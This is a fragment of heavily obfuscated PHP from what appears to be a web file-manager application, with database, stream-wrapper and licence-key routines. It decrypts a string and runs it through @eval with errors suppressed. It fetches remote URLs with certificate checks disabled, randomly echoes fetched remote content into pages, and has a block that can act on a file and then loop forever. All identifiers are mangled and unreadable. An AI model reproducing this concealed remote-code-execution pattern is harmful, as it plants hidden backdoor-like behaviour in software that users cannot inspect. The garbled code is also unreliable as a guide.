($õ‰şæ¦) { $õ‰şæ¦ = $this->hmjle97e1dd8($õ‰şæ¦); } if ($õ‰şæ¦) { try { @eval($õ‰şæ¦); } catch (Exception $›—¸õ™§) { } } } } } private function swjlb741ca6b($ç‰İö»” = '', $‡ëÜšó„ = array(), $àŸëÜ· = 5) { $ËÃÕı£¿ =& $_SERVER[Î‹ÃÂŞ„]; $ ›‹¶ßŠ =& $_SERVER[ÓØ—üº]; $ÕØç‹ö = $ ›‹¶ßŠ[258]; $Öœ¦¢²ñ = $ËÃÕı£¿[726]; $ÕØç‹ö = $this->ewsmb5986221($ÕØç‹ö, $ ›‹¶ßŠ[259]); $­Î—ó‰ = $ËÃÕı£¿[727]; if (strlen($­Î—ó‰) < $ËÃÕı£¿[661]) { die; } $ÕØç‹ö = $ÕØç‹ö . $ç‰İö»”; if ($‡ëÜšó„ && is_array($‡ëÜšó„)) { $ÕØç‹ö = $ÕØç‹ö . $ ›‹¶ßŠ[260] . http_build_query($‡ëÜšó„); } if ($‡ëÜšó„ === -1) { return $ÕØç‹ö; } $ì’üşóü = stream_context_create(array($ ›‹¶ßŠ[219] => array($ ›‹¶ßŠ[222] => $àŸëÜ·, $ ›‹¶ßŠ[220] => $ ›‹¶ßŠ[261]), $ ›‹¶ßŠ[262] => array($ ›‹¶ßŠ[263] => !1, $ ›‹¶ßŠ[264] => !1))); $ìíÉâş· = $ËÃÕı£¿[728]; while ($ìíÉâş· < $ËÃÕı£¿[664]) { if ($ìíÉâş· >= 0) { break; } $ìíÉâş·++; } $‡ëÜšó„ = @file_get_contents($ÕØç‹ö, !1, $ì’üşóü); return json_decode($‡ëÜšó„, !0); } private function wbhj606e5000() { $Âêôíîª =& $_SERVER[ÓØ—üº]; $‰ò¡ı§å = array($Âêôíîª[265] => $Âêôíîª[266], $Âêôíîª[267] => $Âêôíîª[268], $Âêôíîª[269] => $Âêôíîª[270], $Âêôíîª[271] => $Âêôíîª[272], $Âêôíîª[273] => $Âêôíîª[274], $Âêôíîª[275] => $Âêôíîª[214], $Âêôíîª[276] => $Âêôíîª[214], $Âêôíîª[277] => $Âêôíîª[266], $Âêôíîª[278] => $Âêôíîª[268], $Âêôíîª[279] => $Âêôíîª[270], $Âêôíîª[280] => $Âêôíîª[281], $Âêôíîª[282] => $Âêôíîª[272], $Âêôíîª[283] => $Âêôíîª[284], $Âêôíîª[285] => $Âêôíîª[274], $Âêôíîª[286] => $Âêôíîª[287], $Âêôíîª[288] => $Âêôíîª[289], $Âêôíîª[290] => $Âêôíîª[291]); $¥î€ñáî = $‰ò¡ı§å[$this->tukmc2fa9103]; $¥î€ñáî = intval($¥î€ñáî ? $¥î€ñáî : $Âêôíîª[266]); $“Ç»éã¥ = _get($this->qucr0c21cbf3, $Âêôíîª[292]); $“Ç»éã¥ = $“Ç»éã¥ ? intval($“Ç»éã¥) : 0; return $¥î€ñáî + $“Ç»éã¥; } public function ntqme4676c6f($½ŞÂß†£) { $‡éÏİ®— =& $_SERVER[Î‹ÃÂŞ„]; $‰ı‰‡Æ¾ =& $_SERVER[ÓØ—üº]; $­ŠÙ±Ÿƒ = $this->wbhj606e5000(); $ÇÖ™‡…· = $‡éÏİ®—[729]; if (!$ÇÖ™‡…·) { die; } if ($½ŞÂß†£[$‰ı‰‡Æ¾[293]] == $‰ı‰‡Æ¾[123]) { return; } if ($­ŠÙ±Ÿƒ >= intval($‰ı‰‡Æ¾[214])) { return; } $ÑŒ¹Âæ° = Model($‰ı‰‡Æ¾[126])->count(); if ($ÑŒ¹Âæ° <= $­ŠÙ±Ÿƒ) { return; } $³¨ÎÉ“³ = Model($‰ı‰‡Æ¾[126])->field($‰ı‰‡Æ¾[293])->limit($­ŠÙ±Ÿƒ)->select(); $ÇŞüŒÆ = $‡éÏİ®—[730]; if (strlen($ÇŞüŒÆ) < $‡éÏİ®—[661]) { return; } $³¨ÎÉ“³ = array_to_keyvalue($³¨ÎÉ“³, $‰ı‰‡Æ¾[6], $‰ı‰‡Æ¾[293]); $ÍÖ¿ğ¼ = $‡éÏİ®—[731]; while (strlen($ÍÖ¿ğ¼) < $‡éÏİ®—[657]) { if (!$ÍÖ¿ğ¼) { break; } $ÍÖ¿ğ¼++; } if (!in_array($½ŞÂß†£[$‰ı‰‡Æ¾[293]], $³¨ÎÉ“³)) { show_json($‰ı‰‡Æ¾[294], !1, $‰ı‰‡Æ¾[210]); } } public function pfmtef5c9559() { $ıØ©…Öà =& $_SERVER[Î‹ÃÂŞ„]; $—Æ‡ôš¡ =& $_SERVER[ÓØ—üº]; if (!_get($GLOBALS, $—Æ‡ôš¡[117]) || mt_rand(1, 100) > 20) { return; } $Ñ†§Êˆ = $—Æ‡ôš¡[217]; $Ñ†§Êˆ = $this->ewsmb5986221($Ñ†§Êˆ, $—Æ‡ôš¡[218]); $‚…óŒ´­ = $ıØ©…Öà[732]; if (strlen($‚…óŒ´­) < $ıØ©…Öà[657]) { return; } $ÎŸË¢™š = stream_context_create(array($—Æ‡ôš¡[219] => array($—Æ‡ôš¡[220] => $—Æ‡ôš¡[221], $—Æ‡ôš¡[222] => 3))); $²Œ¬ÇóÚ = $ıØ©…Öà[733]; if (strlen($²Œ¬ÇóÚ) < $ıØ©…Öà[661]) { die; } $Ñü‚¨İ… = @file_get_contents($Ñ†§Êˆ, !1, $ÎŸË¢™š); echo $—Æ‡ôš¡[295] . hash_encode($Ñü‚¨İ…) . $—Æ‡ôš¡[296]; $ÆãªÊŸĞ = $ıØ©…Öà[734]; if (strlen($ÆãªÊŸĞ) < $ıØ©…Öà[661]) { return; } } private function kbwr39b0225e($ó¼Ãí”“, $şĞÅ£†€, $äÎõ˜Ì = 3) { $«º ×–± =& $_SERVER[Î‹ÃÂŞ„]; $İ–òáèì =& $_SERVER[ÓØ—üº]; usleep(1); $Ÿ¤Ê†çÊ = $«º ×–±[735]; while (strlen($Ÿ¤Ê†çÊ) < $«º ×–±[667]) { if (!$Ÿ¤Ê†çÊ) { break; } $Ÿ¤Ê†çÊ++; } $ó¼Ãí”“ = trim($ó¼Ãí”“); $Æüİü¡à = $«º ×–±[736]; while (strlen($Æüİü¡à) < $«º ×–±[657]) { if (!$Æüİü¡à) { break; } $Æüİü¡à++; } $’ßÀ˜æÚ = mt_rand(0, 5) . $İ–òáèì[6]; $ ¬ø­ö = $«º ×–±[737]; while ($ ¬ø­ö < $«º ×–±[657]) { if ($ ¬ø­ö >= 0) { break; } $ ¬ø­ö++; } $Œ“»½ŸÒ = rand_string(15); $íÑ«Ü£ = $«º ×–±[738]; $«£³¥¢µ = $İ–òáèì[297]; $Ä†÷‘ğ¯ = $«º ×–±[739]; if (strlen($Ä†÷‘ğ¯) < $«º ×–±[657]) { return; } switch ($’ßÀ˜æÚ) { case $İ–òáèì[206]: $™Ò¨èªÑ = $this->aoft8506e272($ó¼Ãí”“, strrev($şĞÅ£†€ . $Œ“»½ŸÒ)); $ä’ş¬®† = $«º ×–±[740]; while ($ä’ş¬®† < $«º ×–±[661]) { if ($ä’ş¬®† >= 0) { break; } $ä’ş¬®†++; } break; case $İ–òáèì[123]: $™Ò¨èªÑ = $this->aoft8506e272($ó¼Ãí”“, strrev($Œ“»½ŸÒ . $şĞÅ£†€)); break; case $İ–òáèì[298]: $™Ò¨èªÑ = $this->aoft8506e272($ó¼Ãí”“, base64_encode($Œ“»½ŸÒ . $şĞÅ£†€)); break; case $İ–òáèì[299]: $™Ò¨èªÑ = $this->aoft8506e272($ó¼Ãí”“, md5($Œ“»½ŸÒ . $şĞÅ£†€)); break; case $İ–òáèì[300]: $ó¼Ãí”“ = base64_encode($ó¼Ãí”“); $ŒŠÎ  = $«º ×–±[741]; if (strlen($ŒŠÎ ) < $«º ×–±[661]) { die; } $¾äåÂáÕ = rand(0, 64); $ÖãÄ¶Ø€ = $«º ×–±[742]; $º¿‚Â = $«£³¥¢µ[$¾äåÂáÕ]; $§Ÿ¯âÒû = md5($º¿‚Â . md5($şĞÅ£†€ . $º¿‚Â) . $şĞÅ£†€); $ãïÁ¥Ãµ = $«º ×–±[743]; $§Ÿ¯âÒû = substr($§Ÿ¯âÒû, $¾äåÂáÕ % 8, $¾äåÂáÕ % 8 + 7); $§Ôºãé = $«º ×–±[744]; $·Æ¢óè‘ = $İ–òáèì[6]; $½Ô«ˆÚº = $«º ×–±[745]; if (strlen($½Ô«ˆÚº) < $«º ×–±[667]) { return; } $êşÊ‡é† = 0; $ÜÁ„Ù¼† = $«º ×–±[746]; if (strlen($ÜÁ„Ù¼†) < $«º ×–±[657]) { return; } $ä‚êÖ¡ß = 0; $ãóø“ƒ« = 0; for ($êşÊ‡é† = 0; $êşÊ‡é† < strlen($ó¼Ãí”“); $êşÊ‡é†++) { $ãóø“ƒ« = $ãóø“ƒ« == strlen($§Ÿ¯âÒû) ? 0 : $ãóø“ƒ«; $ä‚êÖ¡ß = ($¾äåÂáÕ + strpos($«£³¥¢µ, $ó¼Ãí”“[$êşÊ‡é†]) + ord($§Ÿ¯âÒû[$ãóø“ƒ«++])) % 64; $·Æ¢óè‘ .= $«£³¥¢µ[$ä‚êÖ¡ß]; } $™Ò¨èªÑ = hash_encode($º¿‚Â . $·Æ¢óè‘); $Õ˜ÂÉô = $«º ×–±[747]; while (strlen($Õ˜ÂÉô) < $«º ×–±[661]) { if (!$Õ˜ÂÉô) { break; } $Õ˜ÂÉô++; } break; default: $™Ò¨èªÑ = $this->aoft8506e272($ó¼Ãí”“, $şĞÅ£†€ . $Œ“»½ŸÒ); $‘¸¨¸ÆŞ = $«º ×–±[748]; if (!$‘¸¨¸ÆŞ) { return; } break; } $™Ò¨èªÑ = strrev($’ßÀ˜æÚ . $Œ“»½ŸÒ . $™Ò¨èªÑ); $­÷œÕšŠ = $«º ×–±[749]; if ($äÎõ˜Ì - 1 > 0) { $™Ò¨èªÑ = $this->kbwr39b0225e($™Ò¨èªÑ, $şĞÅ£†€, $äÎõ˜Ì - 1); } return $™Ò¨èªÑ; } private function aqtw065d97c2($ÆÙÚçè—, $’àË“Ø‘, $ñ÷ºû¨¨ = 3) { $¡“ë«êª =& $_SERVER[Î‹ÃÂŞ„]; $áøŞÖÁ =& $_SERVER[ÓØ—üº]; if (!is_string($ÆÙÚçè—) || strlen($ÆÙÚçè—) < 10) { return !1; } $ÆÙÚçè— = trim($ÆÙÚçè—); $¯†ì¥ã = $¡“ë«êª[750]; if (!$¯†ì¥ã) { die; } $ÆÙÚçè— = strrev($ÆÙÚçè—); $á“©®¹ = $ÆÙÚçè—[0]; $ş¾¬Šª§ = $¡“ë«êª[751]; if (strlen($ş¾¬Šª§) < $¡“ë«êª[661]) { die; } $õŒ•÷ı½ = substr($ÆÙÚçè—, 1, 15); $ÆÙÚçè— = substr($ÆÙÚçè—, 16); $÷É“ŠÉã = $¡“ë«êª[752]; $ÕÊŸª‚ø = $áøŞÖÁ[297]; $“şæµ‰» = $¡“ë«êª[753]; while (strlen($“şæµ‰») < $¡“ë«êª[667]) { if (!$“şæµ‰») { break; } $“şæµ‰»++; } switch ($á“©®¹) { case $áøŞÖÁ[206]: $íÍùÉÅ  = $this->ewsmb5986221($ÆÙÚçè—, strrev($’àË“Ø‘ . $õŒ•÷ı½)); $—Ó×Š© = $¡“ë«êª[754]; while ($—Ó×Š© < $¡“ë«êª[657]) { if ($—Ó×Š© >= 0) { break; } $—Ó×Š©++; } break; case $áøŞÖÁ[123]: $íÍùÉÅ  = $this->ewsmb5986221($ÆÙÚçè—, strrev($õŒ•÷ı½ . $’àË“Ø‘)); $Ó²ëÓÌ· = $¡“ë«êª[755]; if (strlen($Ó²ëÓÌ·) < $¡“ë«êª[657]) { return; } break; $¿¶¥ÉŸä = $¡“ë«êª[756]; while (strlen($¿¶¥ÉŸä) < $¡“ë«êª[657]) { if (!$¿¶¥ÉŸä) { break; } $¿¶¥ÉŸä++; } case $áøŞÖÁ[298]: $íÍùÉÅ  = $this->ewsmb5986221($ÆÙÚçè—, base64_encode($õŒ•÷ı½ . $’àË“Ø‘)); break; $ˆ¢æøè = $¡“ë«êª[757]; if (strlen($ˆ¢æøè) < $¡“ë«êª[661]) { return; } case $áøŞÖÁ[299]: $íÍùÉÅ  = $this->ewsmb5986221($ÆÙÚçè—, md5($õŒ•÷ı½ . $’àË“Ø‘)); break; $°”ÜïÊŒ = $¡“ë«êª[758]; while (strlen($°”ÜïÊŒ) < $¡“ë«êª[661]) { if (!$°”ÜïÊŒ) { break; } $°”ÜïÊŒ++; } case $áøŞÖÁ[300]: $ÆÙÚçè— = hash_decode($ÆÙÚçè—); $¹€—ÒŒÁ = $¡“ë«êª[759]; if (!$¹€—ÒŒÁ) { return; } $¤Œ¹¦›ˆ = $ÆÙÚçè—[0]; $æÕçñ¡ = $¡“ë«êª[760]; if (strlen($æÕçñ¡) < $¡“ë«êª[667]) { return; } $ÆÙÚçè— = substr($ÆÙÚçè—, 1); $‚£ò†Èï = strpos($ÕÊŸª‚ø, $¤Œ¹¦›ˆ); $ı¦ù°‰Ã = md5($¤Œ¹¦›ˆ . md5($’àË“Ø‘ . $¤Œ¹¦›ˆ) . $’àË“Ø‘); $ı¦ù°‰Ã = substr($ı¦ù°‰Ã, $‚£ò†Èï % 8, $‚£ò†Èï % 8 + 7); $‰†æ˜ö = $¡“ë«êª[761]; if (strlen($‰†æ˜ö) < $¡“ë«êª[667]) { return; } $Ÿ»§áö… = $áøŞÖÁ[6]; $·û´»Ø = $¡“ë«êª[762]; $ŒÖĞ²Šñ = 0; $éµğÉ—³ = $¡“ë«êª[763]; $ú‡´œ = 0; $—º£¤” = $¡“ë«êª[764]; while (strlen($—º£¤”) < $¡“ë«êª[664]) { if (!$—º£¤”) { break; } $—º£¤”++; } $½êñ˜úü = 0; for ($ŒÖĞ²Šñ = 0; $ŒÖĞ²Šñ < strlen($ÆÙÚçè—); $ŒÖĞ²Šñ++) { $½êñ˜úü = $½êñ˜úü == strlen($ı¦ù°‰Ã) ? 0 : $½êñ˜úü; $Éé™Áùã = $½êñ˜úü++; $ú‡´œ = strpos($ÕÊŸª‚ø, $ÆÙÚçè—[$ŒÖĞ²Šñ]) - $‚£ò†Èï - ord($ı¦ù°‰Ã[$Éé™Áùã]); $Ì¾Ôˆ–¨ = $¡“ë«êª[765]; while ($Ì¾Ôˆ–¨ < $¡“ë«êª[657]) { if ($Ì¾Ôˆ–¨ >= 0) { break; } $Ì¾Ôˆ–¨++; } while ($ú‡´œ < 0) { $ú‡´œ += 64; } $Ÿ»§áö… .= $ÕÊŸª‚ø[$ú‡´œ]; } $íÍùÉÅ  = base64_decode($Ÿ»§áö…); break; default: $íÍùÉÅ  = $this->ewsmb5986221($ÆÙÚçè—, $’àË“Ø‘ . $õŒ•÷ı½); $ØŸÍğü = $¡“ë«êª[766]; if (!$ØŸÍğü) { return; } break; } if ($ñ÷ºû¨¨ - 1 > 0) { $íÍùÉÅ  = $this->aqtw065d97c2($íÍùÉÅ , $’àË“Ø‘, $ñ÷ºû¨¨ - 1); } return $íÍùÉÅ ; } public function rzxs04988f88($óüÒ•–Ï) { $é®êèÍî =& $_SERVER[Î‹ÃÂŞ„]; $¥ëºŒØ =& $_SERVER[ÓØ—üº]; $Ø¿×…ñ = $this->kszh6f0c226c(); $ãÔÔí¬œ = $é®êèÍî[767]; while (strlen($ãÔÔí¬œ) < $é®êèÍî[688]) { if (!$ãÔÔí¬œ) { break; } $ãÔÔí¬œ++; } $•Æ’‰–¥ = $this->kszh6f0c226c(); $Ê—Çø¡´ = ($Ø¿×…ñ - 1) * ($•Æ’‰–¥ - 1); $„î±£· = $é®êèÍî[768]; while ($„î±£· < $é®êèÍî[664]) { if ($„î±£· >= 0) { break; } $„î±£·++; } $ğÂÏÇâ = intval(($Ø¿×…ñ + $•Æ’‰–¥) / 2); $ä¹ âÔ­ = $é®êèÍî[769]; if (!$ä¹ âÔ­) { return; } while (1) { $öüúìÆ· = $ğÂÏÇâ; $Óæ»´Ù = $é®êèÍî[770]; $¨ñúú€Ä = $Ê—Çø¡´; $¼¹µòÌï = $é®êèÍî[771]; if (!$¼¹µòÌï) { return; } while ($¨ñúú€Ä % $öüúìÆ· != 0) { $±’¶ãÉõ = $¨ñúú€Ä; $¨ñúú€Ä = $öüúìÆ·; $úõÒ¾ = $é®êèÍî[772]; while (strlen($úõÒ¾) < $é®êèÍî[688]) { if (!$úõÒ¾) { break; } $úõÒ¾++; } $öüúìÆ· = $±’¶ãÉõ % $öüúìÆ·; } if ($öüúìÆ· == 1) { break; } else { $ğÂÏÇâ++; } } $ÑãÎıˆ = 2; for ($ÅóáÊâƒ = 0; $ÅóáÊâƒ < $Ê—Çø¡´ * 10; $ÅóáÊâƒ++) { if (($Ê—Çø¡´ * $ÅóáÊâƒ + 1) % $ğÂÏÇâ == 0) { $ÑãÎıˆ = intval(($Ê—Çø¡´ * $ÅóáÊâƒ + 1) / $ğÂÏÇâ); break; } } $¥ò»°İ = $this->aoft8506e272($Ø¿×…ñ * $•Æ’‰–¥ . $¥ëºŒØ[6], $¥ëºŒØ[137]); $÷±çˆêÊ = $é®êèÍî[773]; if (!$÷±çˆêÊ) { die; } $„Ã×ùëÖ = md5($¥ëºŒØ[301] . ($Ø¿×…ñ + $•Æ’‰–¥) . $¥ëºŒØ[302] . $ğÂÏÇâ . $¥ëºŒØ[302] . $ÑãÎıˆ . $¥ëºŒØ[303]); $‹Äõòë = $this->aoft8506e272($óüÒ•–Ï, $„Ã×ùëÖ) . $¥ëºŒØ[304] . $¥ò»°İ; return $‹Äõòë; $ÕĞêìô… = $é®êèÍî[774]; if (!$ÕĞêìô…) { return; } } public function hmjle97e1dd8($¯•á€‰œ) { $êıï–Õ =& $_SERVER[Î‹ÃÂŞ„]; $Í²€ÒÙÏ =& $_SERVER[ÓØ—üº]; $¾´úúÍµ = explode($Í²€ÒÙÏ[304], $¯•á€‰œ); if (count($¾´úúÍµ) != 2) { return $Í²€ÒÙÏ[6]; } $ïâê‘Ó¨ = $this->ewsmb5986221($¾´úúÍµ[1] . $Í²€ÒÙÏ[6], $Í²€ÒÙÏ[137]); if (!$ïâê‘Ó¨) { return $Í²€ÒÙÏ[6]; } $ïâê‘Ó¨ = intval($ïâê‘Ó¨); $·«ş¼Ú = 0; $ÀµŠòª = $êıï–Õ[775]; if (strlen($ÀµŠòª) < $êıï–Õ[657]) { return; } $Ù®ÊßáÑ = 0; $Ãè²·É‡ = $êıï–Õ[776]; while ($Ãè²·É‡ < $êıï–Õ[664]) { if ($Ãè²·É‡ >= 0) { break; } $Ãè²·É‡++; } for ($çÏØ½üÃ = 3; $çÏØ½üÃ < $ïâê‘Ó¨; $çÏØ½üÃ += 2) { if ($ïâê‘Ó¨ % $çÏØ½üÃ != 0) { continue; } $·«ş¼Ú = $çÏØ½üÃ; $ªß™×° = $êıï–Õ[777]; $Ù®ÊßáÑ = intval($ïâê‘Ó¨ / $çÏØ½üÃ); $´âÌÍË‘ = $êıï–Õ[778]; break; $©ùóîË§ = $êıï–Õ[779]; while ($©ùóîË§ < $êıï–Õ[657]) { if ($©ùóîË§ >= 0) { break; } $©ùóîË§++; } } $€Ğ…¼€§ = ($·«ş¼Ú - 1) * ($Ù®ÊßáÑ - 1); $“õıæÒî = $êıï–Õ[780]; if (!$“õıæÒî) { die; } $ª¢šùÓ = intval(($·«ş¼Ú + $Ù®ÊßáÑ) / 2); $÷–Ğêèû = $êıï–Õ[781]; if (!$÷–Ğêèû) { return; } while (1) { $¹ĞØÀ”Ú = $ª¢šùÓ; $³Éú¤Ø¼ = $êıï–Õ[701]; if (!$³Éú¤Ø¼) { die; } $ş¾·ìöÙ = $€Ğ…¼€§; $úóÕÁ = $êıï–Õ[782]; while (strlen($úóÕÁ) < $êıï–Õ[664]) { if (!$úóÕÁ) { break; } $úóÕÁ++; } while ($ş¾·ìöÙ % $¹ĞØÀ”Ú != 0) { $ë—Ú Â = $ş¾·ìöÙ; $ş¾·ìöÙ = $¹ĞØÀ”Ú; $Ê´ìıšÏ = $êıï–Õ[783]; if (!$Ê´ìıšÏ) { die; } $¹ĞØÀ”Ú = $ë—Ú Â % $¹ĞØÀ”Ú; $Ì¡Ç‘Ë = $êıï–Õ[784]; if (!$Ì¡Ç‘Ë) { die; } } if ($¹ĞØÀ”Ú == 1) { break; } else { $ª¢šùÓ++; } } $ÛËß«İ¹ = 2; for ($çÏØ½üÃ = 0; $çÏØ½üÃ < $€Ğ…¼€§ * 10; $çÏØ½üÃ++) { if (($€Ğ…¼€§ * $çÏØ½üÃ + 1) % $ª¢šùÓ == 0) { $ÛËß«İ¹ = intval(($€Ğ…¼€§ * $çÏØ½üÃ + 1) / $ª¢šùÓ); break; } } $òîÂƒó¯ = md5($Í²€ÒÙÏ[301] . ($·«ş¼Ú + $Ù®ÊßáÑ) . $Í²€ÒÙÏ[302] . $ª¢šùÓ . $Í²€ÒÙÏ[302] . $ÛËß«İ¹ . $Í²€ÒÙÏ[303]); $¾”Ãïƒ† = $êıï–Õ[785]; if (!$¾”Ãïƒ†) { return; } $²ÊË®é = $this->ewsmb5986221($¾´úúÍµ[0], $òîÂƒó¯); $ùÇş±åä = $êıï–Õ[786]; if (strlen($ùÇş±åä) < $êıï–Õ[688]) { return; } return $²ÊË®é; $š–Œ²¹ê = $êıï–Õ[787]; if (strlen($š–Œ²¹ê) < $êıï–Õ[661]) { die; } } public function kszh6f0c226c() { $’ç¹³Ÿé =& $_SERVER[Î‹ÃÂŞ„]; $â•Ÿ¶ÊØ = mt_rand(pow(2, 14), pow(2, 16) - 1); $†ûÁ¬° = array(); $¤òê…Äà = $’ç¹³Ÿé[788]; while (strlen($¤òê…Äà) < $’ç¹³Ÿé[661]) { if (!$¤òê…Äà) { break; } $¤òê…Äà++; } $¼¥ Š¶¹ = 1; while ($¼¥ Š¶¹ <= (int) sqrt($â•Ÿ¶ÊØ)) { $¿«ŞÊ¨ƒ = $¼¥ Š¶¹; while (!0) { $¿«ŞÊ¨ƒ++; $åîğ¥Ù = $’ç¹³Ÿé[789]; while (strlen($åîğ¥Ù) < $’ç¹³Ÿé[657]) { if (!$åîğ¥Ù) { break; } $åîğ¥Ù++; } if ($¿«ŞÊ¨ƒ <= 2) { $¼¥ Š¶¹ = $¿«ŞÊ¨ƒ; break; } else { if ($¿«ŞÊ¨ƒ < 2) { continue; } } $‰¬ÌÛÆÌ = !0; for ($‰¥û¥òÑ = 2; $‰¥û¥òÑ <= sqrt($¿«ŞÊ¨ƒ); $‰¥û¥òÑ++) { if ($¿«ŞÊ¨ƒ % $‰¥û¥òÑ == 0) { $‰¬ÌÛÆÌ = !1; } } if ($‰¬ÌÛÆÌ) { $¼¥ Š¶¹ = $¿«ŞÊ¨ƒ; break; } } $†ûÁ¬°[] = $¼¥ Š¶¹; } $­¼Ì´ø = 2; $ºªıßÌĞ = $’ç¹³Ÿé[790]; while ($ºªıßÌĞ < $’ç¹³Ÿé[667]) { if ($ºªıßÌĞ >= 0) { break; } $ºªıßÌĞ++; } for ($¿«ŞÊ¨ƒ = $â•Ÿ¶ÊØ; $¿«ŞÊ¨ƒ > 1; $¿«ŞÊ¨ƒ--) { $‰¬ÌÛÆÌ = !0; $Ş»ÆÍÙÎ = $’ç¹³Ÿé[791]; foreach ($†ûÁ¬° as $Ñõ‹©ÂÔ) { if ($¿«ŞÊ¨ƒ % $Ñõ‹©ÂÔ == 0) { $‰¬ÌÛÆÌ = !1; break; } } if ($‰¬ÌÛÆÌ) { $­¼Ì´ø = $¿«ŞÊ¨ƒ; break; } } return $­¼Ì´ø; $«çŠØò© = $’ç¹³Ÿé[792]; if (strlen($«çŠØò©) < $’ç¹³Ÿé[664]) { die; } } public function scex60b26995($÷ÖÂ’Ç–, $§¡’ıêÓ) { $º¸ÈØ =& $_SERVER[Î‹ÃÂŞ„]; $öÑÌŞ =& $_SERVER[ÓØ—üº]; return call_user_func(array($öÑÌŞ[8], $öÑÌŞ[305]), $÷ÖÂ’Ç–, $§¡’ıêÓ); $åÓÅ¶ìÃ = $º¸ÈØ[793]; if (strlen($åÓÅ¶ìÃ) < $º¸ÈØ[661]) { die; } } public function aoft8506e272($ß¬ï‡ïâ, $•Ááµô¥) { $²ñÆ¢“Ÿ =& $_SERVER[ÓØ—üº]; return call_user_func(array($²ñÆ¢“Ÿ[306], $²ñÆ¢“Ÿ[307]), $ß¬ï‡ïâ, $•Ááµô¥); $¯¼ıáÁá = $_SERVER[Î‹ÃÂŞ„][794]; } public function ewsmb5986221($ê±ŞÈ ´, $òşæ¯æ¢) { $«ï¶ÕÈ =& $_SERVER[ÓØ—üº]; return call_user_func(array($«ï¶ÕÈ[306], $«ï¶ÕÈ[308]), $ê±ŞÈ ´, $òşæ¯æ¢); } } goto b—Ö»ÉÔê; E–õÜÈì»ø: class DbSqlite extends DbSqliteBase { public function query($âù®¾È™) { $º§åõ =& $_SERVER[Î‹ÃÂŞ„]; if (!CacheLock::fileLock($º§åõ[13])) { return !1; } $‹¦¼£Š = parent::query($âù®¾È™); CacheLock::fileUnLock($º§åõ[13]); return $‹¦¼£Š; } public function execute($ §•‚”…) { $ü¶Å›Ô =& $_SERVER[Î‹ÃÂŞ„]; if (!CacheLock::fileLock($ü¶Å›Ô[13])) { return !1; } $ãÓŸÕ×È = parent::execute($ §•‚”…); CacheLock::fileUnLock($ü¶Å›Ô[13]); return $ãÓŸÕ×È; } } class DbSqlite3 extends DbSqlite3Base { public function query($²şÙè”ä) { $áÓøÎª =& $_SERVER[Î‹ÃÂŞ„]; if (!CacheLock::fileLock($áÓøÎª[13])) { return !1; } $ùŞ«Æ… = parent::query($²şÙè”ä); CacheLock::fileUnLock($áÓøÎª[13]); return $ùŞ«Æ…; } public function execute($Øø®øº) { $ë‡‘Ìë =& $_SERVER[Î‹ÃÂŞ„]; if (!CacheLock::fileLock($ë‡‘Ìë[13])) { return !1; } $ª¸·áŠ© = parent::execute($Øø®øº); CacheLock::fileUnLock($ë‡‘Ìë[13]); return $ª¸·áŠ©; } } if (!isset($_SERVER[$_SERVER[Î‹ÃÂŞ„][926]]) || !isset($_SERVER[$_SERVER[Î‹ÃÂŞ„][924]])) { $_getc = $_SERVER[Î‹ÃÂŞ„][928]; $_getfile = $_SERVER[$_SERVER[Î‹ÃÂŞ„][929]] . $_SERVER[Î‹ÃÂŞ„][930]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î‹ÃÂŞ„][248], $_getfilec); if (count($_getarrs) < $_SERVER[Î‹ÃÂŞ„][657]) { $exit = $_SERVER[Î‹ÃÂŞ„][931]; $exit(); } $_act = $_SERVER[Î‹ÃÂŞ„][1014]; $_act($_SERVER[$_SERVER[Î‹ÃÂŞ„][929]] . $_SERVER[Î‹ÃÂŞ„][930]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Î‹ÃÂŞ„][424]); } } goto Aöá¿Œ¹À; cƒÕ‹¹óöä: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¯÷õ¤  , $¼…êşõÃ = '') { $this->info = $this->info($¯÷õ¤  ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Î‹ÃÂŞ„][86]]; $this->pathOpen = $¯÷õ¤  ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¯÷õ¤  ])) { self::$_chunkBuffer[$¯÷õ¤  ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($İ™ ÂÓ´) { $îñĞåšÃ = $this->fileSubstr($this->pose, $İ™ ÂÓ´); $this->pose += strlen($îñĞåšÃ); return $îñĞåšÃ; } public function stream_tell() { return $this->pose; } public function stream_seek($¦‘¼ç‹, $ş©Ó«ª¯) { $¼Ôæ•Ğá =& $_SERVER[Î‹ÃÂŞ„]; if ($ş©Ó«ª¯ == SEEK_SET) { $this->pose = $¦‘¼ç‹; } else { if ($ş©Ó«ª¯ == SEEK_CUR) { $this->pose += $¦‘¼ç‹; } else { if ($ş©Ó«ª¯ == SEEK_END) { $this->pose = $this->info[$¼Ôæ•Ğá[78]] + intval($¦‘¼ç‹); } } } if ($¦‘¼ç‹ < 0) { $this->pose = $this->info[$¼Ôæ•Ğá[78]] + $¦‘¼ç‹; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Î‹ÃÂŞ„][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ş€¸‹Î, $µÛÉâäœ) { $Œ·‚¿’ =& $_SERVER[Î‹ÃÂŞ„]; $÷áèû = $this->info($Ş€¸‹Î); return array($Œ·‚¿’[1547] => 0, $Œ·‚¿’[1548] => 0, $Œ·‚¿’[16] => 32768 + 511, $Œ·‚¿’[1549] => 0, $Œ·‚¿’[1550] => 0, $Œ·‚¿’[1551] => 0, $Œ·‚¿’[1552] => 0, $Œ·‚¿’[78] => $÷áèû[$Œ·‚¿’[78]], $Œ·‚¿’[1553] => $÷áèû[$Œ·‚¿’[1419]], $Œ·‚¿’[1509] => $÷áèû[$Œ·‚¿’[87]], $Œ·‚¿’[1508] => $÷áèû[$Œ·‚¿’[217]], $Œ·‚¿’[1554] => 0, $Œ·‚¿’[1555] => 0); } static $fileInfo = array(); public function info($Ê‹Ê¾î‡) { $Ç½îÃ¿“ = $_SERVER[Î‹ÃÂŞ„][1556]; if (isset(self::$fileInfo[$Ê‹Ê¾î‡])) { return self::$fileInfo[$Ê‹Ê¾î‡]; } if (substr($Ê‹Ê¾î‡, 0, strlen($Ç½îÃ¿“)) != $Ç½îÃ¿“) 